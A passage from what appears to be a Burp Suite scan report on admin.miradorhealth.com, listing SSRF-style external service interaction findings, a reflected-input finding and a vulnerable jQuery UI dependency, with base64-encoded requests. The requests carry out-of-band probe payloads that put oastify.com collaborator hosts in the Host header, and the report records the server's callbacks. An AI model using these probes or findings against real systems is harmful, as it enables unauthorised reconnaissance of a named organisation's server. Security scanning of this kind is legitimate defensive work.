    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>tjg8pua95qc4xo6128y1n0n3euko8m2av9jz6pue.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IHRqZzhwdWE5NXFjNHhvNjEyOHkxbjBuM2V1a284bTJhdjlqejZwdWUub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>147.182.176.17</originIp>
      <time>2024-Dec-15 00:57:59.938 UTC</time>
      <lookupType>A</lookupType>
      <lookupHost>tjg8pua95qc4xo6128y1n0n3euko8m2av9jz6pue.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>6368993685208281088</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/responsive.bootstrap4.min.js]]></path>
    <location><![CDATA[/js/datatables/responsive.bootstrap4.min.js]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>tjg8pua95qc4xo6128y1n0n3euko8m2av9jz6pue.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IHRqZzhwdWE5NXFjNHhvNjEyOHkxbjBuM2V1a284bTJhdjlqejZwdWUub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>206.189.185.124</originIp>
      <time>2024-Dec-15 00:58:00.568 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IHRqZzhwdWE5NXFjNHhvNjEyOHkxbjBuM2V1a284bTJhdjlqejZwdWUub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1ncW1nbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>8652204694194496512</serialNumber>
    <type>4197376</type>
    <name><![CDATA[Input returned in response (reflected)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/vfs_fonts.js]]></path>
    <location><![CDATA[/js/datatables/vfs_fonts.js [URL path filename]]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Reflection of input arises when data is copied from a request and echoed into the application's immediate response.</p><p>Input being returned in application responses is not a vulnerability in its own right. However, it is a prerequisite for many client-side vulnerabilities, including cross-site scripting, open redirection, content spoofing, and response header injection. Additionally, some server-side vulnerabilities such as SQL injection are often easier to identify and exploit when input is returned in responses. In applications where input retrieval is rare and the environment is resistant to automated testing (for example, due to a web application firewall), it might be worth subjecting instances of it to focused manual testing. </p>]]></issueBackground>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/20.html">CWE-20: Improper Input Validation</a></li><li><a href="https://cwe.mitre.org/data/definitions/116.html">CWE-116: Improper Encoding or Escaping of Output</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The value of the URL path filename is copied into the application's response.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC9qcy9kYXRhdGFibGVzL2VqcGYxajFvMTcgSFRUUC8yDQpIb3N0OiBhZG1pbi5taXJhZG9yaGVhbHRoLmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlLCBicg0KQWNjZXB0OiB0ZXh0L2h0bWwsYXBwbGljYXRpb24veGh0bWwreG1sLGFwcGxpY2F0aW9uL3htbDtxPTAuOSxpbWFnZS9hdmlmLGltYWdlL3dlYnAsaW1hZ2UvYXBuZywqLyo7cT0wLjgsYXBwbGljYXRpb24vc2lnbmVkLWV4Y2hhbmdlO3Y9YjM7cT0wLjcNCkFjY2VwdC1MYW5ndWFnZTogZW4tVVM7cT0wLjksZW47cT0wLjgNClVzZXItQWdlbnQ6IE1vemlsbGEvNS4wIChXaW5kb3dzIE5UIDEwLjA7IFdpbjY0OyB4NjQpIEFwcGxlV2ViS2l0LzUzNy4zNiAoS0hUTUwsIGxpa2UgR2Vja28pIENocm9tZS8xMzEuMC42Nzc4Ljg2IFNhZmFyaS81MzcuMzYNCkNvbm5lY3Rpb246IGNsb3NlDQpDYWNoZS1Db250cm9sOiBtYXgtYWdlPTANClVwZ3JhZGUtSW5zZWN1cmUtUmVxdWVzdHM6IDENClNlYy1DSC1VQTogIi5Ob3QvQSlCcmFuZCI7dj0iOTkiLCAiR29vZ2xlIENocm9tZSI7dj0iMTMxIiwgIkNocm9taXVtIjt2PSIxMzEiDQpTZWMtQ0gtVUEtUGxhdGZvcm06IFdpbmRvd3MNClNlYy1DSC1VQS1Nb2JpbGU6ID8wDQoNCg==]]></request>
      <response base64="true"><![CDATA[]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>347463718611822592</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/vfs_fonts.js]]></path>
    <location><![CDATA[/js/datatables/vfs_fonts.js]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>c2fr8dtso9vng7pklrhk6j6mxd37r5htasyil89x.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGMyZnI4ZHRzbzl2bmc3cGtscmhrNmo2bXhkMzdyNWh0YXN5aWw4OXgub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>157.245.168.9</originIp>
      <time>2024-Dec-15 00:56:30.427 UTC</time>
      <lookupType>AAAA</lookupType>
      <lookupHost>c2fr8dtso9vng7pklrhk6j6mxd37r5htasyil89x.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>1072998346241762304</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/datatables/vfs_fonts.js]]></path>
    <location><![CDATA[/js/datatables/vfs_fonts.js]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>c2fr8dtso9vng7pklrhk6j6mxd37r5htasyil89x.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGMyZnI4ZHRzbzl2bmc3cGtscmhrNmo2bXhkMzdyNWh0YXN5aWw4OXgub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>104.248.76.109</originIp>
      <time>2024-Dec-15 00:56:31.381 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGMyZnI4ZHRzbzl2bmc3cGtscmhrNmo2bXhkMzdyNWh0YXN5aWw4OXgub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1ncWlnbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>8450218801627183104</serialNumber>
    <type>3146240</type>
    <name><![CDATA[External service interaction (DNS)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/daterangepicker.min.js]]></path>
    <location><![CDATA[/js/daterangepicker.min.js]]></location>
    <severity>Information</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>The ability to induce an application to interact with an arbitrary external service, such as a web or mail server, does not constitute a vulnerability in its own right. This might even be the intended behavior of the application. However, in some cases, it can indicate a vulnerability with serious consequences.</p>
<p>If you can trigger DNS-based interactions, it is normally possible to trigger interactions using other service types. Burp Scanner reports these as separate issues. You may find that a payload, such as a URL, only triggers a DNS-based interaction, even though you were expecting interactions with a different service as well. This could be due to egress filters on the network layer that prevent the application from connecting to these other services. However, some systems perform DNS lookups without any intention of connecting to the remote host. This behavior is typically harmless.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy. By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side DNS lookups of arbitrary domain names.<br><br>The payload <b>bp4qvcgrb8im36cj8q4jtitlkcq6e4ds6ruhh75w.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed a DNS lookup of the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGJwNHF2Y2dyYjhpbTM2Y2o4cTRqdGl0bGtjcTZlNGRzNnJ1aGg3NXcub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>DNS</interactionType>
      <originIp>178.128.64.126</originIp>
      <time>2024-Dec-15 00:59:26.613 UTC</time>
      <lookupType>AAAA</lookupType>
      <lookupHost>bp4qvcgrb8im36cj8q4jtitlkcq6e4ds6ruhh75w.oastify.com</lookupHost>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>7406682807422191616</serialNumber>
    <type>3146256</type>
    <name><![CDATA[External service interaction (HTTP)]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/daterangepicker.min.js]]></path>
    <location><![CDATA[/js/daterangepicker.min.js]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>External service interaction arises when it is possible to induce an application to interact with an arbitrary external service, such as a web or mail server. The ability to trigger arbitrary external service interactions does not constitute a vulnerability in its own right, and in some cases might even be the intended behavior of the application.
However, in many cases, it can indicate a vulnerability with serious consequences.</p>
<p>The ability to send requests to other systems can allow the vulnerable server to be used as an attack proxy.
  By submitting suitable payloads, an attacker can cause the application server to attack other systems that it can interact with. 
  This may include public third-party systems, internal systems within the same organization, or services available on the local loopback adapter of the application server itself. 
  Depending on the network architecture, this may expose highly vulnerable internal services that are not otherwise accessible to external attackers. </p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>You should review the purpose and intended use of the relevant application functionality, 
  and determine whether the ability to trigger arbitrary external service interactions is intended behavior. 
  If so, you should be aware of the types of attacks that can be performed via this behavior and take appropriate measures. 
  These measures might include blocking network access from the application server to other internal systems, and hardening the application server itself to remove any services available on the local loopback adapter.</p>
<p>If the ability to trigger arbitrary external service interactions is not intended behavior, then you should implement a whitelist of permitted services and hosts, and block any interactions that do not appear on this whitelist.</p>

<p>Out-of-Band Application Security Testing (OAST) is highly effective at uncovering high-risk features, to the point where finding the root cause of an interaction can be quite challenging. To find the source of an external service interaction, try to identify whether it is triggered by specific application functionality, or occurs indiscriminately on all requests. If it occurs on all endpoints, a front-end CDN or application firewall may be responsible, or a back-end analytics system parsing server logs. In some cases, interactions may originate from third-party systems; for example, a HTTP request may trigger a poisoned email which passes through a link-scanner on its way to the recipient.</p>]]></remediationBackground>
    <references><![CDATA[<ul><li><a href="https://portswigger.net/blog/introducing-burp-collaborator">Burp Collaborator</a></li><li><a href="https://portswigger.net/burp/application-security-testing/oast">Out-of-band application security testing (OAST)</a></li><li><a href="https://portswigger.net/research/cracking-the-lens-targeting-https-hidden-attack-surface">PortSwigger Research: Cracking the Lens</a></li></ul>]]></references>
    <vulnerabilityClassifications><![CDATA[<ul><li><a href="https://cwe.mitre.org/data/definitions/918.html">CWE-918: Server-Side Request Forgery (SSRF)</a></li><li><a href="https://cwe.mitre.org/data/definitions/406.html">CWE-406: Insufficient Control of Network Message Volume (Network Amplification)</a></li></ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[It is possible to induce the application to perform server-side HTTPS requests to arbitrary domains.<br><br>The payload <b>bp4qvcgrb8im36cj8q4jtitlkcq6e4ds6ruhh75w.oastify.com</b> was submitted in the SSL SNI value and the HTTP Host header.<br><br>The application performed an HTTPS request to the specified domain.]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGJwNHF2Y2dyYjhpbTM2Y2o4cTRqdGl0bGtjcTZlNGRzNnJ1aGg3NXcub2FzdGlmeS5jb20NClByYWdtYTogbm8tY2FjaGUNCkNhY2hlLUNvbnRyb2w6IG5vLWNhY2hlLCBuby10cmFuc2Zvcm0NCkNvbm5lY3Rpb246IGNsb3NlDQoNCg==]]></request>
    </requestresponse>
    <collaboratorEvent>
      <interactionType>HTTPS</interactionType>
      <originIp>104.248.76.109</originIp>
      <time>2024-Dec-15 00:59:27.586 UTC</time>
      <requestresponse>
        <request method="GET" base64="true"><![CDATA[R0VUIC8gSFRUUC8xLjENCkhvc3Q6IGJwNHF2Y2dyYjhpbTM2Y2o4cTRqdGl0bGtjcTZlNGRzNnJ1aGg3NXcub2FzdGlmeS5jb20NCnVzZXItYWdlbnQ6IE1vemlsbGEvNS4wIChYMTE7IExpbnV4IHg4Nl82NCkgQXBwbGVXZWJLaXQvNTM3LjM2IChLSFRNTCwgbGlrZSBHZWNrbykgQ2hyb21lLzU1LjAuMjg4My44NyBTYWZhcmkvNTM3LjM2DQpBY2NlcHQtRW5jb2Rpbmc6IGd6aXAsIGRlZmxhdGUNCkFjY2VwdDogKi8qDQpDb25uZWN0aW9uOiBrZWVwLWFsaXZlDQoNCg==]]></request>
        <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpTZXJ2ZXI6IEJ1cnAgQ29sbGFib3JhdG9yIGh0dHBzOi8vYnVycGNvbGxhYm9yYXRvci5uZXQvDQpYLUNvbGxhYm9yYXRvci1WZXJzaW9uOiA0DQpDb250ZW50LVR5cGU6IHRleHQvaHRtbA0KQ29udGVudC1MZW5ndGg6IDYzDQoNCjxodG1sPjxib2R5Pjd5ZWQ3bjl6NmRjMTVvem9senJzdmp6am1ncXJnbHJnaWZpZ3o8L2JvZHk+PC9odG1sPg==]]></response>
        <responseRedirected>false</responseRedirected>
      </requestresponse>
    </collaboratorEvent>
  </issue>
  <issue>
    <serialNumber>6429963442815385600</serialNumber>
    <type>5243008</type>
    <name><![CDATA[Vulnerable JavaScript dependency]]></name>
    <host ip="44.217.210.54">https://admin.miradorhealth.com</host>
    <path><![CDATA[/js/jquery-ui.min.js]]></path>
    <location><![CDATA[/js/jquery-ui.min.js]]></location>
    <severity>Low</severity>
    <confidence>Tentative</confidence>
    <issueBackground><![CDATA[<p>
The use of third-party JavaScript libraries can introduce a range of DOM-based vulnerabilities, including some that can be used to hijack user accounts like DOM-XSS. 
</p>

<p>
Common JavaScript libraries typically enjoy the benefit of being heavily audited. This may mean that bugs are quickly identified and patched upstream, resulting in a steady stream of security updates that need to be applied. Although it may be tempting to ignore updates, using a library with missing security patches can make your website exceptionally easy to exploit. Therefore, it's important to ensure that any available security updates are applied promptly. 
</p>
<p>
Some library vulnerabilities expose every application that imports the library, but others only affect applications that use certain library features. Accurately identifying which library vulnerabilities apply to your website can be difficult, so we recommend applying all available security updates regardless.
</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Develop a patch-management strategy to ensure that security updates are promptly applied to all third-party libraries in your application. Also, consider reducing your attack surface by removing any libraries that are no longer in use.</p>]]></remediationBackground>
